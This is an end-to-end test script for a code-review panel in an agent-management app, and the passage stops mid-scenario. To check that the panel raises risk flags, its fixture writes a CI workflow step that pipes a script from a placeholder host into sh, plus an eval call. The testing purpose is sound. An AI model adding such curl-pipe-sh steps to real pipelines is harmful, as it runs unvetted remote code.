#!/usr/bin/env node
// Scenario: F21 — the Review Desk (⌘G) on the REAL app, with two fake agents.
//
// A throwaway repository on branch hermes/task carries three "turns" of
// uncommitted work: Agent A changed src/app.js (turn 1), Agent B changed
// src/util.js, package-lock.json and .github/workflows/ci.yml (turn 2),
// Agent C changed README.md (turn 3). All three are the fake vendor CLI
// (tools/fake-agents/fake-cli.mjs) started through `hi run`: A and B as
// `claude` (a vendor whose launch installs a prompt hook), C as a vendor
// whose launch installs none — the first of GitHub Copilot CLI, Aider and
// Gemini CLI whose real binary is NOT on this machine, so the fake can
// never be shadowed by a real CLI (a login shell's path_helper puts the
// system folders ahead of the fake's) — all in the same folder; the turn
// ledger (F20) is not filled yet, so the turns are injected through the
// test bridge with exactly the patches git produced.
//
//   run 1  fresh install with the reviewDesk flag switched off (it is on by
//          default since 2.0): the command palette's ⌘G entry is "Toggle Git
//          Panel"; the launchHelper and reviewDesk flags are turned on
//   run 2  relaunch:
//          - the ⌘G menu route opens the Review Desk, the palette entry
//            reads "Review Desk", and no git panel is mounted
//          - by file: five changed files; the lockfile and the workflow
//            carry risk flags, src/app.js carries none
//          - a viewed checkbox survives closing and reopening the desk
//          - by turn: T1 (Agent A) and T2 (Agent B); a comment on a line of
//            turn 2 is routed to Agent B, one on turn 1 to Agent A
//          - Send to Agent A: review-1.md is written, ONE tagged line
//            arrives in A's terminal (the fake records it), A's prompt hook
//            reports it through `hi signal`, and Hermes shows "delivered"
//          - Send to Agent B (a vendor without a prompt hook): the line
//            arrives in B's terminal, nothing comes back, Hermes shows
//            "not delivered" with Retry; Retry pastes the same line again
//          - Send to Agent A while it is on a turn: nothing is typed into
//            it, not even once A's turn ends (its Stop hook) — Hermes shows
//            the send as waiting with "Send now" off while A works and on
//            afterwards; only that second press pastes the line, and then
//            Hermes shows "delivered"
//          - Send to Agent C (a vendor whose launch installs no prompt
//            hook): the line arrives in C's terminal and Hermes shows
//            "pasted — cannot confirm" (no Retry), not "not delivered"
//          - Revert turn 2: the preview lists its three files and applies
//            cleanly; afterwards those files are back at the base and
//            src/app.js and README.md still have turns 1 and 3
//
// Negative control: HERMES_E2E_F21_RISK_FILE=src/app.js (expect a risk flag
// on a plain edit) must end in RESULT: FAIL.
//
// Windows: the fake `claude` and the fake vendor C have to be on the user's registry Path (see
// N12); that is only changed on a CI runner, so outside CI this scenario
// reports RESULT: SKIP there.
//
//   node e2e/app/build.mjs
//   node e2e/app/scenarios/F21-review-desk.mjs
//
// Evidence (log, screenshots, the fakes' records) goes to
// HERMES_E2E_EVIDENCE, or <out dir>/evidence/F21-review-desk.

import { execFileSync } from "node:child_process";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { platform, tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { REPO_ROOT, createLogger, finishScenario, launchApp, outDir, sleep, skipScenario } from "../harness.mjs";

const SCENARIO = "F21-review-desk";
const startedAt = Date.now();
const evidenceDir = process.env.HERMES_E2E_EVIDENCE || join(outDir(), "evidence", SCENARIO);
const logFile = join(evidenceDir, "scenario.log");
rmSync(logFile, { force: true });
const log = createLogger(logFile);
const onWindows = platform() === "win32";
/** The file that must carry a risk flag. Overridable so the check can be shown to fail. */
const RISK_FILE = process.env.HERMES_E2E_F21_RISK_FILE || "package-lock.json";

function assert(condition, message) {
  if (!condition) throw new Error(`ASSERTION FAILED: ${message}`);
  log(`  ok — ${message}`);
}

// ─── A throwaway repository with two turns of uncommitted work ──────

const work = realpathSync.native(mkdtempSync(join(tmpdir(), "hermes-e2e-f21-")));
const repo = join(work, "f21-repo");
const fakeBin = join(work, "bin");
const recordDir = join(work, "records");
const privateHome = join(work, "home");
for (const d of [repo, fakeBin, recordDir, privateHome]) mkdirSync(d, { recursive: true });
const gitEnv = {
  ...process.env,
  GIT_AUTHOR_NAME: "Hermes Test",
  GIT_AUTHOR_EMAIL: "test@example.com",
  GIT_COMMITTER_NAME: "Hermes Test",
  GIT_COMMITTER_EMAIL: "test@example.com",
  GIT_CONFIG_NOSYSTEM: "1",
};
const git = (...args) => execFileSync("git", ["-C", repo, ...args], { env: gitEnv, encoding: "utf8" });
const write = (rel, text) => {
  mkdirSync(join(repo, rel, ".."), { recursive: true });
  writeFileSync(join(repo, rel), text);
};
const read = (rel) => readFileSync(join(repo, rel), "utf8");

const BASE = {
  "src/app.js": "const a = 1;\nconst b = 2;\nexport default a + b;\n",
  "src/util.js": "export function twice(x) {\n  return x * 2;\n}\n",
  "package.json": '{\n  "name": "f21-fixture",\n  "version": "1.0.0"\n}\n',
  "package-lock.json": '{\n  "name": "f21-fixture",\n  "lockfileVersion": 3,\n  "packages": {}\n}\n',
  ".github/workflows/ci.yml": "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n",
  "README.md": "# f21 fixture\n",
};
execFileSync("git", ["init", "-q", "-b", "main", repo], { env: gitEnv });
git("config", "user.name", "Hermes Test");
git("config", "user.email", "test@example.com");
git("config", "commit.gpgsign", "false");
// The app's own git (the revert) reads this repository's config: keep LF
// checkouts on Windows too, so file text compares exactly.
git("config", "core.autocrlf", "false");
for (const [rel, text] of Object.entries(BASE)) write(rel, text);
git("add", ".");
git("commit", "-q", "-m", "base");
git("checkout", "-q", "-b", "hermes/task");
// Turn 1 (Agent A): src/app.js.
write("src/app.js", "const a = 1;\nconst b = 3;\nexport default a + b;\n");
const patch1 = git("diff", "--", "src/app.js");
// Turn 2 (Agent B): util, lockfile, workflow.
write("src/util.js", "export function twice(x) {\n  return x + x;\n}\nexport const answer = eval('42');\n");
write("package-lock.json", '{\n  "name": "f21-fixture",\n  "lockfileVersion": 3,\n  "packages": {\n    "node_modules/left-pad": { "version": "1.3.0" }\n  }\n}\n');
write(".github/workflows/ci.yml", "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n      - run: curl -fsSL https://example.invalid/setup.sh | sh\n");
const patch2 = git("diff", "--", "src/util.js", "package-lock.json", ".github/workflows/ci.yml");
// Turn 3 (Agent C): the README.
write("README.md", "# f21 fixture\n\nRun `npm test` before pushing.\n");
const patch3 = git("diff", "--", "README.md");
assert(patch1.includes("+const b = 3;") && patch2.includes("+export const answer") && patch3.includes("+Run `npm test`"), "the fixture's three turn patches are real git diffs");

// ─── A fake `claude` and a fake vendor C on PATH (the same arrangement as N12) ──

const FAKE_CLI = join(REPO_ROOT, "tools", "fake-agents", "fake-cli.mjs");
/** Vendors whose launch installs no prompt hook (src-tauri/src/pty/launch.rs), by card title and binary. */
const VENDOR_C_CANDIDATES = [
  { id: "copilot", card: "GitHub Copilot CLI", bin: "copilot" },
  { id: "aider", card: "Aider", bin: "aider" },
  { id: "gemini", card: "Gemini CLI", bin: "gemini" },
];
const systemDirs = onWindows ? [] : ["/usr/local/bin", "/opt/homebrew/bin", "/opt/local/bin", "/usr/bin", "/bin"];
const realBinaryOf = (bin) =>
  [...(process.env.PATH || "").split(delimiter), ...systemDirs]
    .filter(Boolean)
    .flatMap((d) => [bin, `${bin}.exe`, `${bin}.cmd`].map((n) => join(d, n)))
    .find((p) => existsSync(p)) ?? null;
const VENDOR_C = VENDOR_C_CANDIDATES.find((v) => !realBinaryOf(v.bin));
if (!VENDOR_C) {
  log(`every no-prompt-hook vendor (${VENDOR_C_CANDIDATES.map((v) => v.bin).join(", ")}) is really installed here; a real CLI must never be started by a test`);
  rmSync(work, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
  skipScenario({ scenario: SCENARIO, evidenceDir, reason: "no vendor free for the fake", log });
}
const FAKE_NAMES = ["claude", VENDOR_C.bin];
for (const name of FAKE_NAMES) {
  if (onWindows) {
    writeFileSync(join(fakeBin, `${name}.cmd`), `@"${process.execPath}" "${FAKE_CLI}" %*\r\n`);
  } else {
    writeFileSync(join(fakeBin, name), `#!/bin/sh\nexec "${process.execPath}" "${FAKE_CLI}" "$@"\n`);
    chmodSync(join(fakeBin, name), 0o755);
  }
}
const hasRealAgent = (dir) => FAKE_NAMES.some((name) => [name, `${name}.exe`, `${name}.cmd`].some((n) => existsSync(join(dir, n))));
process.env.PATH = [fakeBin, ...(process.env.PATH || "").split(delimiter).filter((d) => d && !hasRealAgent(d))].join(delimiter);
for (const name of Object.keys(process.env)) if (name.startsWith("ANTHROPIC_")) delete process.env[name];

const canEditRegistryPath = onWindows && process.env.GITHUB_ACTIONS === "true";
function addFakeBinToRegistryPath() {
  if (!canEditRegistryPath) return null;
  let old = null;
  try {
    const out = execFileSync("reg", ["query", "HKCU\\Environment", "/v", "Path"], { encoding: "utf8" });
    const m = out.match(/^\s*Path\s+REG_\w+\s+(.*)$/im);
    old = m ? m[1].trim() : "";
  } catch {
    old = null;
  }
  const next = old ? `${old};${fakeBin}` : fakeBin;
  execFileSync("reg", ["add", "HKCU\\Environment", "/v", "Path", "/t", "REG_EXPAND_SZ", "/d", next, "/f"]);
  log("  (CI runner: added the fake claude folder to the user's registry Path)");
  return () => {
    if (old === null) execFileSync("reg", ["delete", "HKCU\\Environment", "/v", "Path", "/f"]);
    else execFileSync("reg", ["add", "HKCU\\Environment", "/v", "Path", "/t", "REG_EXPAND_SZ", "/d", old, "/f"]);
    log("  (CI runner: restored the user's registry Path)");
  };
}
if (onWindows && !canEditRegistryPath) {
  log("this scenario needs the fake claude on a Windows terminal's PATH, which means the user's registry Path; that is only changed on a CI runner");
  rmSync(work, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
  skipScenario({ scenario: SCENARIO, evidenceDir, reason: "Windows outside CI", log });
}
let undoRegistryPath = null;

const setFakeMode = (mode) => {
  writeFileSync(join(recordDir, "mode"), `${mode}\n`);
  log(`  fake vendor mode: ${mode}`);
};
const records = () =>
  readdirSync(recordDir)
    .filter((f) => f.startsWith("launch-"))
    .sort()
    .map((f) => JSON.parse(readFileSync(join(recordDir, f), "utf8")));
/** The fake's record for one Hermes session (it saves after every prompt). */
const recordOf = (sessionId) => records().find((r) => r.env?.HERMES_SESSION_ID === sessionId) ?? null;

function launch(run, { first = false } = {}) {
  const runDir = join(evidenceDir, `run-${run}`);
  const common = { runDir, log, env: { HERMES_FAKE_DIR: recordDir } };
  return onWindows
    ? launchApp({ ...common, home: "real", resetData: first })
    : launchApp({ ...common, home: "private", homeDir: privateHome });
}

// ─── UI steps ────────────────────────────────────────────────────────

async function completeOnboarding(bridge) {
  await bridge.waitFor("the welcome dialog", `return !!e2e.first(".onboarding-dialog");`);
  for (let i = 0; i < 3; i++) {
    await bridge.click(".onboarding-actions .onboarding-btn-primary");
    await sleep(150);
  }
  await bridge.waitFor("the privacy screen", `return e2e.all(".onboarding-privacy-checkbox input").length === 2;`);
  await bridge.clickWhenReady(`
    const [analytics, policy] = e2e.all(".onboarding-privacy-checkbox input");
    if (analytics.checked) e2e.click(analytics);
    if (!policy.checked) e2e.click(policy);
    return true;
  `);
  await bridge.waitFor("the Finish button to become enabled", `
    const b = e2e.first(".onboarding-actions .onboarding-btn-primary");
    return !!b && !b.disabled;
  `);
  await bridge.click(".onboarding-actions .onboarding-btn-primary");
  await bridge.waitFor("the welcome dialog to close", `return !e2e.first(".onboarding-backdrop");`);
  await sleep(300);
  await dismissWhatsNew(bridge);
}
async function dismissWhatsNew(bridge) {
  if (await bridge.exists(".whatsnew-backdrop")) {
    await bridge.click(".whatsnew-footer .whatsnew-btn-primary");
    await bridge.waitFor("the what's-new dialog to close", `return !e2e.first(".whatsnew-backdrop");`);
  }
}
async function waitForReturningLaunch(bridge) {
  await bridge.waitFor("the app UI to be ready (no onboarding this time)", `
    return !!e2e.first(".topbar-title, .topbar") && !e2e.first(".onboarding-backdrop");
  `);
  await dismissWhatsNew(bridge);
}

/** Settings > (7 clicks on the title) > Flags: set one flag's override. */
async function setFlagOverride(bridge, flagId, value) {
  await bridge.clickByName("Settings");
  await bridge.waitFor("the Settings dialog", `return !!e2e.first('[role="dialog"] .settings-title');`);
  await bridge.eval(`
    const title = e2e.must(e2e.first(".settings-title"), "settings title");
    for (let i = 0; i < 7; i++) e2e.click(title);
    return true;
  `);
  await bridge.waitFor("the hidden Flags tab", `return e2e.all(".settings-tab").some((el) => e2e.norm(el.innerText) === "Flags");`);
  await bridge.eval(`
    const tab = e2e.all(".settings-tab").find((el) => e2e.norm(el.innerText) === "Flags");
    return e2e.click(e2e.must(tab, "Flags tab"));
  `);
  const selector = `select[data-flag-id="${flagId}"]`;
  await bridge.waitFor(`the ${flagId} flag control`, `return !!e2e.first(${JSON.stringify(selector)});`);
  const result = await bridge.eval(`
    const sel = e2e.must(e2e.first(${JSON.stringify(selector)}), "flag select");
    const setter = Object.getOwnPropertyDescriptor(window.HTMLSelectElement.prototype, "value").set;
    setter.call(sel, ${JSON.stringify(value)});
    sel.dispatchEvent(new Event("change", { bubbles: true }));
    return sel.value;
  `);
  assert(result === value, `flag "${flagId}" set to "${value}"`);
  await bridge.waitFor("the override to be saved", `
    const raw = await window.__TAURI_INTERNALS__.invoke("get_settings");
    const overrides = raw.feature_flag_overrides ? JSON.parse(raw.feature_flag_overrides) : {};
    return overrides[${JSON.stringify(flagId)}] === ${value === "on" ? "true" : "false"};
  `);
  await bridge.click(".settings-close");
  await bridge.waitFor("the Settings dialog to close", `return !e2e.first(".settings-title");`);
}

const setInput = (selector, value) => `
  const el = e2e.must(e2e.first(${JSON.stringify(selector)}), ${JSON.stringify(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
  el.focus();
  setter.call(el, ${JSON.stringify(value)});
  el.dispatchEvent(new Event("input", { bubbles: true }));
  return el.value;
`;
const PRIMARY = ".session-creator-actions .session-creator-btn-primary, .session-creator-footer-actions .session-creator-btn-primary";
async function clickPrimary(bridge, what) {
  // The wizard may still be closing from the previous click (a slow
  // runner): then there is nothing left to click.
  const r = await bridge.clickWhenReady(`
    if (!e2e.first(".session-creator")) return { clicked: null };
    const b = e2e.must(e2e.first(${JSON.stringify(PRIMARY)}), "the wizard's primary button");
    return e2e.click(b);
  `);
  log(r.clicked === null ? `  wizard ${what}: already closed` : `  wizard ${what}: clicked "${r.clicked}"`);
  await sleep(300);
  return r.clicked;
}
/**
 * "Create session" is the wizard's last press: the wizard then stays open,
 * its button disabled ("Creating..."), until the session exists, and closes
 * by itself. On a slow runner that takes seconds (the first session starts
 * the session host), so the step walk must stop at this press instead of
 * looking for another step in a wizard that is only busy.
 */
const isCreatePress = (clicked) => clicked === null || clicked === "Create session";

/**
 * New Session wizard: an agent session (the fake, through `hi run`) in the
 * fixture repository, named `label`, from the vendor card whose title starts
 * with `card`. A later session on the same branch picks "Use current
 * branch" (the branch is already taken by the first).
 */
async function createAgentSession(bridge, label, card = "Claude") {
  const before = await bridge.terminalIds();
  if (await bridge.exists("button.es-tile-primary")) await bridge.click("button.es-tile-primary");
  else await bridge.click(".activity-bar-action");
  await bridge.waitFor("the New Session wizard", `return !!e2e.first(".session-creator");`, { timeoutMs: 20_000 });
  await bridge.waitFor("the agent picker", `return e2e.all(".session-creator-provider-card").length > 0;`, { timeoutMs: 20_000 });
  await bridge.clickWhenReady(`
    const card = e2e.all(".session-creator-provider-card").find((c) => c.innerText.trim().startsWith(${JSON.stringify(card)}));
    return e2e.click(e2e.must(card, "the ${card} card"));
  `);
  await bridge.eval(`
    const box = e2e.first(".session-creator-agent-view input[type=checkbox]");
    if (box && box.checked) e2e.click(box);
    return true;
  `);
  await clickPrimary(bridge, "agent");
  // Folder step: the fixture repo (added by path the first time, then listed).
  await bridge.waitFor("the folder step", `return !!e2e.first(".session-creator-scan-input");`, { timeoutMs: 20_000 });
  const listed = await bridge.eval(`
    const row = e2e.all(".project-picker-item").find((el) => el.innerText.includes("f21-repo"));
    if (!row) return false;
    if (!row.classList.contains("project-picker-item-attached")) e2e.click(row);
    return true;
  `);
  if (!listed) {
    await bridge.eval(setInput(".session-creator-scan-input", repo));
    await bridge.clickByName("Scan", { within: ".project-picker-footer" });
  }
  await bridge.waitFor("the fixture repo to be selected", `
    return e2e.all(".project-picker-item.project-picker-item-attached").some((el) => el.innerText.includes("f21-repo"));
  `);
  await clickPrimary(bridge, "folder");
  // The wizard may show more steps (branch, permissions, confirm); walk them.
  for (let i = 0; i < 8; i++) {
    if (!(await bridge.exists(".session-creator"))) break;
    if (await bridge.exists(".session-creator-branch-multi")) {
      await sleep(400);
      const chosen = await bridge.eval(`return !!e2e.first(".session-creator-branch-selected-label");`);
      if (!chosen) {
        // The branch is taken by the first session: work in the same checkout.
        if (!(await bridge.exists(".branch-selector-body"))) await bridge.click(".session-creator-branch-project-header");
        // By its visible text: the button's accessible name is its title (a hint).
        await bridge.clickWhenReady(`
          const b = e2e.all(".session-creator-branch-multi button").find((el) => e2e.norm(el.innerText) === "Use current branch");
          return e2e.click(e2e.must(b, "the Use current branch button"));
        `);
        await sleep(300);
        if (await bridge.exists(".session-creator-branch-multi")) await clickPrimary(bridge, "branch");
        continue;
      }
    }
    // Name the session when this step asks for one (checked and set in one
    // go: the step can move on between two calls).
    await bridge.eval(`
      const el = e2e.first('input.session-creator-name[placeholder="Session name (optional)"]');
      if (!el) return false;
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
      el.focus();
      setter.call(el, ${JSON.stringify(label)});
      el.dispatchEvent(new Event("input", { bubbles: true }));
      return true;
    `);
    if (isCreatePress(await clickPrimary(bridge, `step ${i + 1}`))) break;
  }
  await bridge.waitFor("the wizard to close", `return !e2e.first(".session-creator");`, { timeoutMs: 60_000 });
  const id = await bridge.waitFor(`the terminal of "${label}"`, `
    const ids = window.__HERMES_E2E__.terminalIds().filter((id) => !${JSON.stringify(before)}.includes(id));
    return ids.length === 1 ? ids[0] : null;
  `, { timeoutMs: 20_000 });
  await bridge.waitForTerminal(id, /fake-cli: ready/, { timeoutMs: 40_000 });
  const data = (await bridge.eval(`return await window.__TAURI_INTERNALS__.invoke("get_sessions");`)).find((s) => s.id === id);
  assert(!!data && sameFolder(data.working_directory, repo), `"${label}" works in the fixture repository (${data?.working_directory})`);
  return id;
}

const sameFolder = (a, b) => {
  const norm = (p) => {
    try {
      p = realpathSync.native(p);
    } catch {
      /* keep as given */
    }
    return p.replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase();
  };
  return norm(a) === norm(b);
};

async function rawInvoke(bridge, cmd, args = {}) {
  return bridge.eval(`
    try {
      const value = await window.__TAURI_INTERNALS__.invoke(${JSON.stringify(cmd)}, ${JSON.stringify(args)});
      return { ok: true, value };
    } catch (e) {
      return { ok: false, error: String(e && e.message ? e.message : e) };
    }
  `);
}
/** The native menu's action, as the ⌘G accelerator delivers it. */
async function menuAction(bridge, action) {
  const r = await rawInvoke(bridge, "plugin:event|emit", { event: "menu-action", payload: { action } });
  assert(r.ok, `the menu action "${action}" was delivered`);
}
async function paletteLabelForGit(bridge) {
  await menuAction(bridge, "view.command-palette");
  await bridge.waitFor("the command palette", `return !!e2e.first(".command-palette");`);
  const labels = await bridge.eval(`return e2e.all(".command-palette-item .command-palette-label").map((el) => e2e.norm(el.textContent));`);
  await menuAction(bridge, "view.command-palette");
  await bridge.waitFor("the command palette to close", `return !e2e.first(".command-palette");`);
  return labels.find((l) => l === "Review Desk" || l === "Toggle Git Panel") ?? null;
}
/** Make the session named `label` the active one through its sidebar row. */
async function selectSession(bridge, label) {
  await bridge.clickWhenReady(`
    const row = e2e.all(".session-item").find((it) => e2e.norm(it.innerText).includes(${JSON.stringify(label)}));
    return e2e.click(e2e.must(row, "the session row of ${label}"));
  `);
  await bridge.waitFor(`"${label}" to be the active session`, `
    const row = e2e.all(".session-item").find((it) => e2e.norm(it.innerText).includes(${JSON.stringify(label)}));
    return row && row.classList.contains("session-item-active") ? true : null;
  `, { timeoutMs: 5_000 });
}
const deskOpen = (bridge) => bridge.exists(".review-desk");
async function openDesk(bridge, how) {
  if (how === "menu") await menuAction(bridge, "view.git-panel");
  else await bridge.click(".session-item-wrapper-active .session-subview-btn[title='Review Desk']");
  await bridge.waitFor("the Review Desk", `return !!e2e.first(".review-desk");`);
  await bridge.waitFor("the desk to finish loading", `return e2e.first(".review-desk")?.getAttribute("data-loading") === "0";`, { timeoutMs: 20_000 });
}
async function closeDesk(bridge) {
  await bridge.eval(`document.body.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true })); return true;`);
  await bridge.waitFor("the Review Desk to close", `return !e2e.first(".review-desk");`);
}
const pressKey = (bridge, key) => bridge.eval(`document.body.dispatchEvent(new KeyboardEvent("keydown", { key: ${JSON.stringify(key)}, bubbles: true, cancelable: true })); return true;`);
const fileRows = (bridge) => bridge.eval(`return e2e.all(".review-file-row").map((r) => ({ path: r.getAttribute("data-path"), flags: (r.getAttribute("data-flags") || "").split(" ").filter(Boolean), viewed: r.querySelector(".review-viewed input")?.checked ?? null, selected: r.classList.contains("review-row-selected") }));`);
const turnRows = (bridge) => bridge.eval(`return e2e.all(".review-turn-row").map((r) => ({ session: r.getAttribute("data-session"), n: Number(r.getAttribute("data-turn")), agent: e2e.norm(r.querySelector(".review-turn-agent")?.textContent), selected: r.classList.contains("review-row-selected") }));`);
async function commentOn(bridge, path, text) {
  await bridge.clickWhenReady(`
    const line = e2e.all('.review-line.review-line-add[data-path="' + CSS.escape(${JSON.stringify(path)}) + '"]')[0];
    return e2e.click(e2e.must(line, "an added line of ${path}"));
  `);
  await bridge.waitFor("the comment editor", `return !!e2e.first(".review-comment-editor textarea");`);
  await bridge.eval(`
    const ta = e2e.must(e2e.first(".review-comment-editor textarea"), "comment textarea");
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
    setter.call(ta, ${JSON.stringify(text)});
    ta.dispatchEvent(new Event("input", { bubbles: true }));
    return true;
  `);
  await bridge.click(".review-comment-save");
  return bridge.waitFor("the comment to appear", `
    const c = e2e.all(".review-comment").find((el) => e2e.norm(el.querySelector(".review-comment-text")?.textContent) === ${JSON.stringify(text)});
    return c ? { session: c.getAttribute("data-session"), turn: Number(c.getAttribute("data-turn")), route: e2e.norm(c.querySelector(".review-comment-route")?.textContent) } : null;
  `);
}
/** The person's keystrokes into a session's terminal. */
async function typeInto(bridge, sessionId, text) {
  const r = await rawInvoke(bridge, "write_to_session", { sessionId, data: Buffer.from(text, "utf8").toString("base64") });
  assert(r.ok, `typed ${JSON.stringify(text)} into ${sessionId.slice(0, 8)}`);
}
// The session's status as Hermes shows it (and as the desk reads it): the
// terminal's own guesses never undo what the agent reported.
const statusOf = (bridge, sessionId) => bridge.eval(`const s = window.__HERMES_E2E__.sessionStatus(${JSON.stringify(sessionId)}); return { kind: s.kind, confidence: s.confidence };`);
/**
 * Waits, as a person would, until the session does not show "working": the
 * desk never types into a busy agent, and the terminal's own guess can say
 * "working" for a moment on output (a Windows console repaints on its own).
 */
async function untilNotWorking(bridge, sessionId, who) {
  const s = await bridge.waitFor(`${who} not to show working`, `
    const s = window.__HERMES_E2E__.sessionStatus(${JSON.stringify(sessionId)});
    return s.kind !== "working" ? { kind: s.kind, confidence: s.confidence, source: s.source } : null;
  `, { timeoutMs: 15_000 });
  log(`  ${who} before Send: ${JSON.stringify(s)}`);
  return s;
}
async function waitForPrompts(sessionId, count, { timeoutMs = 15_000 } = {}) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const rec = recordOf(sessionId);
    if (rec && (rec.prompts ?? []).length >= count) return rec.prompts;
    if (Date.now() > deadline) throw new Error(`expected ${count} prompt(s) in the fake's record for ${sessionId}, have ${rec ? (rec.prompts ?? []).length : "no record"}`);
    await sleep(200);
  }
}
async function quit(current) {
  const exit = await current.stop();
  log(`  app exited: ${JSON.stringify(exit)}`);
  assert(!exit.forced && exit.code === 0, "the app quit cleanly");
}

// ─── Scenario ────────────────────────────────────────────────────────

let app;
let failed = false;
try {
  log(`scenario: ${SCENARIO}   platform: ${platform()}   repo: ${repo}   risk file: ${RISK_FILE}   vendor C: ${VENDOR_C.id}`);
  undoRegistryPath = addFakeBinToRegistryPath();
  setFakeMode("prompts");

  // ── run 1: fresh install, flags off ───────────────────────────────
  log("run 1: fresh install, reviewDesk switched off — the ⌘G palette entry is the old git panel; turn the flags on");
  app = await launch(1, { first: true });
  await completeOnboarding(app.bridge);
  // On by default since 2.0: switch it off (the kill switch) and relaunch.
  await setFlagOverride(app.bridge, "reviewDesk", "off");
  await quit(app);
  app = await launch("1b");
  await waitForReturningLaunch(app.bridge);
  const labelBefore = await paletteLabelForGit(app.bridge);
  assert(labelBefore === "Toggle Git Panel", `with the flag off the palette's ⌘G entry is "${labelBefore}"`);
  assert(!(await deskOpen(app.bridge)), "no Review Desk without the flag");
  await setFlagOverride(app.bridge, "launchHelper", "on");
  await setFlagOverride(app.bridge, "reviewDesk", "on");
  // Honest isolation (on by default since 2.0) would give each agent a
  // worktree of its own; this scenario reviews agents in one repository.
  await setFlagOverride(app.bridge, "honestIsolation", "off");
  await quit(app);

  // ── run 2: flags on ───────────────────────────────────────────────
  log("run 2: relaunch with the flags on; two fake agents in the fixture repository");
  app = await launch(2);
  const { bridge } = app;
  await waitForReturningLaunch(bridge);
  const labelAfter = await paletteLabelForGit(bridge);
  assert(labelAfter === "Review Desk", `with the flag on the palette's ⌘G entry is "${labelAfter}"`);

  const idA = await createAgentSession(bridge, "Agent A");
  log(`  Agent A: ${idA}`);
  setFakeMode("prompts no-prompt-hooks");
  const idB = await createAgentSession(bridge, "Agent B");
  log(`  Agent B: ${idB}`);
  setFakeMode("prompts");
  const idC = await createAgentSession(bridge, "Agent C", VENDOR_C.card);
  log(`  Agent C: ${idC} (${VENDOR_C.card}, the fake ${VENDOR_C.bin})`);
  assert(new Set([idA, idB, idC]).size === 3, "three sessions");
  const recA0 = recordOf(idA);
  const recB0 = recordOf(idB);
  const recC0 = recordOf(idC);
  assert(recA0?.mode === "prompts" && recB0?.mode === "prompts no-prompt-hooks", "Agent A reports prompts through its hook; Agent B is a Claude that never runs it");
  assert(recC0?.env?.HERMES_AGENT === VENDOR_C.id && !recC0.settingsFile, `Agent C was started as ${VENDOR_C.id}, with no hook settings file (${JSON.stringify(recC0?.argv ?? null)})`);

  log("step 1: inject the two turns (what the ledger will record) and open the desk through the ⌘G menu route");
  const injected = await bridge.eval(`
    const H = window.__HERMES_E2E__;
    const mk = (sid, n, startedAt, files, ins, del) => ({ sessionId: sid, n, ref: "refs/hermes/" + sid + "/turn/" + n, startedAt, endedAt: startedAt + 1000, diffstat: { files, insertions: ins, deletions: del } });
    H.injectTurns(${JSON.stringify(idA)}, [{ turn: mk(${JSON.stringify(idA)}, 1, 1790000000000, 1, 1, 1), patch: ${JSON.stringify(patch1)} }]);
    H.injectTurns(${JSON.stringify(idB)}, [{ turn: mk(${JSON.stringify(idB)}, 2, 1790000010000, 3, 4, 2), patch: ${JSON.stringify(patch2)} }]);
    H.injectTurns(${JSON.stringify(idC)}, [{ turn: mk(${JSON.stringify(idC)}, 3, 1790000020000, 1, 2, 0), patch: ${JSON.stringify(patch3)} }]);
    return true;
  `);
  assert(injected === true, "turns injected: T1 for Agent A, T2 for Agent B, T3 for Agent C");
  await selectSession(bridge, "Agent A");
  await openDesk(bridge, "menu");
  assert(!(await bridge.exists(".session-git-panel")) && !(await bridge.exists(".git-panel")), "no other git panel is mounted");
  const scope = await bridge.eval(`return { repo: e2e.first(".review-desk").getAttribute("data-repo"), head: e2e.norm(e2e.first(".review-scope")?.textContent) };`);
  assert(sameFolder(scope.repo, repo) && /hermes\/task → main/.test(scope.head), `the desk reviews the fixture repository on hermes/task against main ("${scope.head}")`);

  log("step 2: by file — five changed files with risk flags on the lockfile and the workflow");
  const rows = await fileRows(bridge);
  log(`  files: ${JSON.stringify(rows)}`);
  const paths = rows.map((r) => r.path).sort();
  assert(JSON.stringify(paths) === JSON.stringify([".github/workflows/ci.yml", "README.md", "package-lock.json", "src/app.js", "src/util.js"]), "the by-file list holds exactly the five changed files");
  const riskRow = rows.find((r) => r.path === RISK_FILE);
  assert(riskRow && riskRow.flags.length > 0, `${RISK_FILE} carries a risk flag (${riskRow?.flags.join(", ")})`);
  assert(rows.find((r) => r.path === "package-lock.json")?.flags.includes("lockfile"), "the lockfile change is flagged as a lockfile");
  const wf = rows.find((r) => r.path === ".github/workflows/ci.yml")?.flags ?? [];
  assert(wf.includes("workflow") && wf.includes("curl_pipe_sh"), `the workflow edit is flagged as a workflow and as curl | sh (${wf.join(", ")})`);
  assert(rows.find((r) => r.path === "src/app.js")?.flags.length === 0, "a plain source edit carries no flag");
  const summary = await bridge.eval(`const s = e2e.first(".review-summary"); return { files: Number(s.getAttribute("data-files")), flags: Number(s.getAttribute("data-flags")), viewed: Number(s.getAttribute("data-viewed")) };`);
  assert(summary.files === 5 && summary.flags >= 3 && summary.viewed === 0, `the summary counts 5 files, ${summary.flags} flags, 0 viewed`);
  await bridge.screenshot(join(evidenceDir, "01-by-file-with-flags.png"));

  log("step 3: viewed checkbox — ticked, kept across closing and reopening the desk; j/k move the selection");
  await bridge.click('.review-file-row[data-path="src/app.js"] .review-viewed input');
  await bridge.waitFor("the file to count as viewed", `return e2e.first(".review-summary")?.getAttribute("data-viewed") === "1";`);
  const before = (await fileRows(bridge)).find((r) => r.selected)?.path;
  await pressKey(bridge, "j");
  const after = await bridge.waitFor("the selection to move", `
    const sel = e2e.all(".review-file-row").find((r) => r.classList.contains("review-row-selected"));
    return sel && sel.getAttribute("data-path") !== ${JSON.stringify(before)} ? sel.getAttribute("data-path") : null;
  `);
  assert(after !== before, `j moved the selection from ${before} to ${after}`);
  await closeDesk(bridge);
